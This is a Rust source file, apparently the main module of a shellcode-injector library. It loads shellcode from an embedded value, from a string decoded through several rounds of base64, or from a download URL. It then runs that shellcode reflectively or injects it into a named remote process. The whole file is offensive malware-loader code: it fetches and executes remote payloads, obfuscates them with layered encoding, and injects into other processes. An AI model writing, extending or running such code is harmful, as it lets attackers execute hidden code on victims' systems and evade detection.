mod injectors;
use injectors::{
    InjectionType::{
        self,
        Reflect,
        Remote
    },
    InjectorType::{
        self, 
        Embedded, 
        Base64Embedded, 
        Url, 
        Base64Url
    },
    download_shellcode,
    decode_b64_shellcode,
    remote_inject,
    reflective_inject,
    write_mem
};

pub struct Injector {
    shellcode: Vec<u8>
}


pub fn load(injector_type: InjectorType) -> Result<Injector, String> {
    match injector_type {
        Embedded(shellcode) =>  Ok(Injector { shellcode }),
        Base64Embedded((sc_string, b64_iterations)) => {
            let sc_bytes = sc_string.as_bytes().to_vec();
            if let Ok(shellcode) = decode_b64_shellcode(&sc_bytes, b64_iterations) {
                return Ok(Injector { shellcode });
            }
            return Err("Could not decode shellcode!".to_string());
        },
        Url(url) => {
            match download_shellcode(&url) {
                Ok(shellcode) => Ok(Injector { shellcode }),
                Err(e) => Err(e)
            }
        },
        Base64Url((url, b64_iterations)) => {
            if let Ok(b64_shellcode) = download_shellcode(&url) {
                return match decode_b64_shellcode(&b64_shellcode, b64_iterations) {
                    Ok(shellcode) => Ok(Injector { shellcode }),
                    Err(e) => Err(e)
                }
            }
            Err("Could not download encoded shellcode!".to_string())
        }
    }
}

pub fn inject(injector: Injector, injection_type: InjectionType, wait: bool) -> Result<(), String> {
    return match injection_type {
        Reflect => unsafe { reflective_inject(&injector.shellcode, wait) },
        Remote(proc_name) => unsafe { remote_inject(&injector.shellcode, wait, &proc_name) } 
    }
} 